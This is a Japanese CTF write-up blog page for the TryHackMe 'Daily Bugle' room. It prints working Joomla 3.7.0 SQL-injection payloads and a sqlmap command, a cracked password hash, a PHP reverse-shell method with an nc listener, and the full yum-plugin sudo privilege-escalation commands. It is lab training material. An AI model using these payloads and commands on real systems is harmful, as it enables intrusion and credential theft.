@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.78.2 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="しろくま">
+<meta name="keywords" content="tech">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe: Daily Bugle">
+<meta name="twitter:title" content="TryHackMe: Daily Bugle">
+<meta property="og:url" content="https://divergen371.github.io/2020/11/tryhackme-daily-bugle/">
+<meta property="twitter:url" content="https://divergen371.github.io/2020/11/tryhackme-daily-bugle/">
+<meta property="og:site_name" content="しろくまの雑記帳">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2020-11-22T23:15:52">
+  
+  
+    <meta property="article:modified_time" content="2020-11-22T23:15:52">
+  
+  
+  
+    
+      <meta property="article:section" content="CTF">
+    
+      <meta property="article:section" content="TryHackMe">
+    
+  
+  
+    
+      <meta property="article:tag" content="Joomla">
+    
+      <meta property="article:tag" content="SQLi">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@aswzjd">
+
+
+  <meta name="twitter:creator" content="@aswzjd">
+
+
+
+
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/c_thumb,w_200,g_face/v1606054898/MyTechBlog/842785_hj2os7.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/c_thumb,w_200,g_face/v1606054898/MyTechBlog/842785_hj2os7.jpg">
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/v1606054898/MyTechBlog/842785_hj2os7.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/v1606054898/MyTechBlog/842785_hj2os7.jpg">
+
+
+
+
+  <meta property="og:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/w_1000,c_fill,ar_1:1,g_auto,r_max,b_rgb:262c35/v1594735710/MyTechBlog/hans-jurgen-mager-AZ31hv9kdzE-unsplash_k0hkjm.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtzr5zvpc/image/upload/w_1000,c_fill,ar_1:1,g_auto,r_max,b_rgb:262c35/v1594735710/MyTechBlog/hans-jurgen-mager-AZ31hv9kdzE-unsplash_k0hkjm.jpg">
+
+
+    <title>TryHackMe: Daily Bugle</title>
+
+    <link rel="icon" href="https://divergen371.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://divergen371.github.io/2020/11/tryhackme-daily-bugle/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://divergen371.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+   <script type="text/javascript" id="MathJax-script" async
+src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+   MathJax.Hub.Config({
+     showProcessingMessages: false,
+     messageStyle: "none",
+     tex2jax: {
+       inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+       processEscapes: true
+     },
+     TeX: {
+       MultLineWidth: "100%",
+       equationNumbers: { autoNumber: "AMS" }
+     },
+     "HTML-CSS": { fonts: ["Latin-Modern"] }
+   });
+  MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+
+  MathJax.Hub.Config({
+  
+  TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+
+<script type="text/x-matjax-config">
+  MathJax.Hub.Register.StartupHook("TeX Jax Ready",function () {
+    var TEX = MathJax.InputJax.TeX;
+    var PREFILTER = TEX.prefilterMath;
+    TEX.Augment({
+      prefilterMath: function (math,displaymode,script) {
+        if (!displaymode) {math = "\\small{"+math+"}"}
+        return PREFILTER.call(TEX,math,displaymode,script);
+      }
+    });
+  });
+</script>h
+
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://divergen371.github.io/">しろくまの雑記帳</a>
+  </div>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://divergen371.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://res.cloudinary.com/dtzr5zvpc/image/upload/w_1000,c_fill,ar_1:1,g_auto,r_max,b_rgb:262c35/v1594735710/MyTechBlog/hans-jurgen-mager-AZ31hv9kdzE-unsplash_k0hkjm.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">しろくま</h4>
+        
+          <h5 class="sidebar-profile-bio">エンジニアワナビのフリーター。  セキュリティ・インフラ・Web制作・CTFに興味を持っています。</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://divergen371.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://divergen371.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://divergen371.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://divergen371.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://divergen371.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/divergen371" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/aswzjd" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-left
+              "
+       style="background-image:url('https://res.cloudinary.com/dtzr5zvpc/image/upload/v1606054898/MyTechBlog/842785_hj2os7.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      TryHackMe: Daily Bugle
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-11-22T23:15:52&#43;09:00">
+        
+  November 22, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://divergen371.github.io/categories/ctf">CTF</a>, 
+    
+      <a class="category-link" href="https://divergen371.github.io/categories/tryhackme">TryHackMe</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">Table of Contents</h1><nav id="TableOfContents">
+<ul>
+<li><a href="#task1-deploy">Task1 Deploy</a>
+<ul>
+<li><a href="#accsess-the-web-server-who-robbed-the-bank">Accsess the web server, who robbed the bank?</a></li>
+</ul></li>
+<li><a href="#task2-obtain-user-and-root">Task2 Obtain user and root</a>
+<ul>
+<li><a href="#what-is-the-joomla-version">What is the Joomla Version?</a></li>
+<li><a href="#what-is-jonah-s-cracked-password-instead-of-using-sqlmap-why-not-use-a-python-script">What is Jonah&rsquo;s cracked password?(Instead of using SQLMap, why not use a python script!)</a></li>
+<li><a href="#what-is-the-flag">What is the flag?</a></li>
+<li><a href="#what-is-root-flag">What is root flag?</a></li>
+</ul></li>
+</ul>
+</nav>
+
+<div class="alert warning ">
+  <p>この記事は私の備忘録を主な目的としています。<br />
+参考にするのは構いませんが、行為の責任主体はあくまで行為者・実行者にあります。<br />
+(私とこの記事は何も強要していないので。)<br />
+参考にした場合の損害等について私は一切関知いたしません。</p>
+</div>
+
+<h1 id="task1-deploy">Task1 Deploy</h1>
+
+<h2 id="accsess-the-web-server-who-robbed-the-bank">Accsess the web server, who robbed the bank?</h2>
+
+<p>まずはポートスキャン</p>
+<pre><code># Nmap 7.91 scan initiated Sun Nov 22 23:33:57 2020 as: nmap -sC -sV -A -oN result.txt 10.10.83.87
+Nmap scan report for 10.10.83.87
+Host is up (0.26s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Nov 22 23:34:35 2020 -- 1 IP address (1 host up) scanned in 38.10 seconds</code></pre>
+<p>port 80でApacheが動いてるのでアクセスしてみる。<br />
+正義の味方が犯罪者になってる。</p>
+
+<h1 id="task2-obtain-user-and-root">Task2 Obtain user and root</h1>
+
+<h2 id="what-is-the-joomla-version">What is the Joomla Version?</h2>
+
+<p>ヒントとして</p>
+
+<blockquote>
+<p>I wonder if this version of Joomla vulnerable&hellip;</p>
+</blockquote>
+
+<p><code>Joomscan</code>をかけてみる。(主要CMS、大体スキャナーがある。)</p>
+<pre><code>    ____  _____  _____  __  __  ___   ___    __    _  _
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+                        (1337.today)
+
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://10.10.83.87 ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing :
+
+snip...</code></pre>
+<p>バージョンは<code>3.7.0</code>だった。</p>
+
+<h2 id="what-is-jonah-s-cracked-password-instead-of-using-sqlmap-why-not-use-a-python-script">What is Jonah&rsquo;s cracked password?(Instead of using SQLMap, why not use a python script!)</h2>
+
+<p>ヒントとして</p>
+
+<blockquote>
+<p>SQLi &amp; JohnTheRipper</p>
+</blockquote>
+
+<p>直前の問題のヒントで、joomla 3.7.0に脆弱性の存在が示唆されているので、<code>searchsploit</code>を使ってみる。</p>
+<pre><code>❯ searchsploit joomla 3.7.0
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection                           | php/webapps/42033.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting        | php/webapps/43488.txt
+--------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results</code></pre><pre><code>❯ searchsploit --path 42033
+  Exploit: Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection
+      URL: https://www.exploit-db.com/exploits/42033
+     Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
+File Type: ASCII text, with CRLF line terminators
+
+Copied EDB-ID #42033&#39;s path to the clipboard</code></pre><pre><code>❯ cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+# Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27
+
+
+Using Sqlmap:
+
+sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)%</code></pre>
+<p>「SQLMapの代わりに、pythonスクリプトを使ってみよう。」とのことで、スクリプトを探してみた。<br />
+<code>Joomla 3.7.0 exploit python</code>でググると<code>Joomblah</code>というスクリプトが見つかる。<br />
+<code>Joomblah</code>をキーワードにしてGithubで検索する。
+そうして見つけたものを今回は、使用した。</p>
+<pre><code>git clone https://github.com/mavr1k7/Joomblah</code></pre><pre><code>❯ python joomblah.py http://10.10.83.87
+
+    .---.    .-&#39;&#39;&#39;-.        .-&#39;&#39;&#39;-.
+    |   |   &#39;   _    \     &#39;   _    \                            .---.
+    &#39;---&#39; /   /` &#39;.   \  /   /` &#39;.   \  __  __   ___   /|        |   |            .
+    .---..   |     \  &#39; .   |     \  &#39; |  |/  `.&#39;   `. ||        |   |          .&#39;|
+    |   ||   &#39;      |  &#39;|   &#39;      |  &#39;|   .-.  .-.   &#39;||        |   |         &lt;  |
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
+    |   | `.   ` ..&#39; /   `.   ` ..&#39; /  |  |  |  |  |  |||/&#39;__ &#39;. |   | .:--.&#39;.  | | .&#39;&#39;&#39;-.
+    |   |    &#39;-...-&#39;`       &#39;-...-&#39;`   |  |  |  |  |  ||:/`  &#39;. &#39;|   |/ |   \ | | |/.&#39;&#39;&#39;. \.
+    |   |                              |  |  |  |  |  |||     | ||   |`&#34; __ | | |  /    | |
+    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |
+ __.&#39;   &#39;                                               |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |
+|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.
+|____.&#39;                                                                `--&#39;  `&#34; &#39;---&#39;   &#39;---&#39;
+         Original code by @stefanlucas
+
+
+Fetching CSRF token
+Testing SQLi
+Found table: fb9j5_users
+Extracting users from fb9j5_users
+Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;jonah&#39;, &#39;jonah@tryhackme.com&#39;, &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;, &#39;&#39;, &#39;&#39;]
+Extracting sessions from fb9j5_session</code></pre>
+<p>パスワードハッシュ発見！<br />
+見たところbcryptみたいですな。 (ハッシュ判別スクリプト作って見ようかな。)</p>
+<pre><code>echo &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39; &gt; jonah.hash</code></pre>
+<p>としてHashcatで解析してみる。<br />
+EC2インスタンスを立ち上げる。</p>
+<pre><code>ubuntu@ip-10-10-1-2:~/hashcatTools$ ./hashcat-6.1.1/hashcat.bin -m 3200 -a 0  ./hash/jonah.hash  ./wordLists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+nvmlDeviceGetFanSpeed(): Not Supported
+
+CUDA API (CUDA 11.0)
+====================
+* Device #1: Tesla T4, 15007/15109 MB, 40MCU
+
+OpenCL API (OpenCL 1.2 CUDA 11.0.228) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #2: Tesla T4, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 239 MB
+
+Dictionary cache hit:
+* Filename..: ./wordLists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
+Time.Started.....: Mon Nov 23 05:50:17 2020 (3 secs)
+Time.Estimated...: Mon Nov 23 10:55:04 2020 (5 hours, 4 mins)
+Guess.Base.......: File (./wordLists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      784 H/s (1.51ms) @ Accel:1 Loops:2 Thr:16 Vec:1
+Recovered........: 0/1 (0.00%) Digests
+Progress.........: 1920/14344384 (0.01%)
+Rejected.........: 0/1920 (0.00%)
+Restore.Point....: 1920/14344384 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:538-540
+Candidates.#1....: amore -&gt; hassan
+Hardware.Mon.#1..: Temp: 35c Util: 99% Core:1590MHz Mem:5000MHz Bus:8
+
+Cracking performance lower than expected?
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
+Time.Started.....: Mon Nov 23 05:50:17 2020 (59 secs)
+Time.Estimated...: Mon Nov 23 05:51:16 2020 (0 secs)
+Guess.Base.......: File (./wordLists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      801 H/s (1.49ms) @ Accel:1 Loops:2 Thr:16 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 47360/14344384 (0.33%)
+Rejected.........: 0/47360 (0.00%)
+Restore.Point....: 46720/14344384 (0.33%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
+Candidates.#1....: 012492 -&gt; damani
+Hardware.Mon.#1..: Temp: 47c Util:100% Core:1590MHz Mem:5000MHz Bus:8
+
+Started: Mon Nov 23 05:50:13 2020
+Stopped: Mon Nov 23 05:51:17 2020</code></pre>
+<p>今回は1分とかからずに解析できたが、最悪のケースで5時間か。<br />
+5時間ならまぁ許容範囲内だが、これより時間がかかるならより強力なインスタンスも視野に入ってくるか。<br />
+近日中にこのハッシュでインスタンスのテストしてみよう。<br />
+(ちなみにJohn the Ripperは<code>p3.2xlarge</code>を推奨していて、且つ公式AMIまで用意してくれている。)</p>
+
+<h2 id="what-is-the-flag">What is the flag?</h2>
+
+<ol>
+<li>自身のマシンで<code>nc -nlvp &lt;port&gt;</code>としてスタンバイ。(rlwrapをつけておくと良い。)</li>
+<li>立ち上げてあるサーバーのadministratorにアクセスして、Jonahのアカウントにログインする。</li>
+<li><code>Extensions</code>、<code>Templates</code>、<code>Templates</code>の順にメニューを選択していき、<code>Beez3</code>をクリック。</li>
+<li><code>index.php</code>をクリックし、書き込まれているものを消して、リバースシェルに差し替えて、画面左上の<code>Save</code>をクリック。
+(リバースシェルは<code>Pentestmonkey</code>の<code>php-reverse-shell</code>を使った。「CHANGE THIS」とされている部分を自身の環境にあわせて変更するのを忘れずに。)</li>
+
+<li><p><code>http://&lt;IP address&gt;/templates/beez3/index.php</code>にアクセスすると、1でスタンバイさせたリスナーにシェルが渡される。</p>
+<pre><code>Connection from 10.10.240.63:46808
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+05:04:28 up 28 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$</code></pre></li>
+</ol>
+
+<p>apacheユーザーでログインしているようです。
+user.txtを探す。home直下のユーザーディレクトリにあるはず。</p>
+<pre><code>sh-4.2$ find /home -type d
+find /home -type d
+/home
+/home/jjameson
+find: &#39;/home/jjameson&#39;: Permission denied</code></pre>
+<p>アクセスできない。<br />
+散々探し回った結果<code>/var/www/html</code>内の<code>configuration.php</code>にパスワード載ってた。<br />
+そのパスワードを使ってログインユーザーをjjamesonに変更。<br />
+ユーザーディレクトリにアクセスしてフラグゲット。</p>
+
+<h2 id="what-is-root-flag">What is root flag?</h2>
+
+<p>ヒントとして</p>
+
+<blockquote>
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+</blockquote>
+
+<p>jjamesonでSSHログイン
+とりあえず、SUIDを調べる。</p>
+<pre><code>sh-4.2$ find / -user root -perm -4000 -print 2&gt; /dev/null
+find / -user root -perm -4000 -print 2&gt; /dev/null
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper</code></pre>
+<p>めぼしいものは無さそう。</p>
+
+<p><code>sudo -l</code>のチェック</p>
+<pre><code>[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;,
+    env_keep+=&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;, env_keep+=&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;,
+    env_keep+=&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;, env_keep+=&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum</code></pre>
+<p>お、yumか。<br />
+/etcを確認してみる。</p>
+<pre><code>[jjameson@dailybugle etc]$ ls -l /etc/*-release
+-rw-r--r--. 1 root root  37 Sep  5  2019 /etc/centos-release
+-rw-r--r--. 1 root root 393 Sep  5  2019 /etc/os-release
+lrwxrwxrwx. 1 root root  14 Dec 14  2019 /etc/redhat-release -&gt; centos-release
+lrwxrwxrwx. 1 root root  14 Dec 14  2019 /etc/system-release -&gt; centos-release
+[jjameson@dailybugle etc]$ cat /etc/centos-release
+CentOS Linux release 7.7.1908 (Core)</code></pre>
+<p>GTFOBinsにyumを使った権限昇格が載ってる。試してみよう。<a href="https://gtfobins.github.io/gtfobins/yum/">GTFOBins/yum</a></p>
+<pre><code>[jjameson@dailybugle ~]$ cat &gt;$TF/x&lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+[jjameson@dailybugle ~]$ cat &gt;$TF/y.conf&lt;&lt;EOF
+[main]
+enabled=1
+EOF
+[jjameson@dailybugle ~]$ cat &gt;$TF/y.py&lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version=&#39;2.1&#39;
+def init_hook(conduit):
+  os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)
+EOF
+
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+root
+sh-4.2# cd /r
+root/ run/
+sh-4.2# cd /r
+root/ run/
+sh-4.2# cd /root/
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+sh-4.2#</code></pre>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://divergen371.github.io/tags/joomla/">Joomla</a>
+
+  <a class="tag tag--primary tag--small" href="https://divergen371.github.io/tags/sqli/">SQLi</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://divergen371.github.io/2020/11/hackthebox-impossible_password/" data-tooltip="HackTheBox: Impossible_Password">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://divergen371.github.io/2020/11/tryhackme-daily-bugle/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
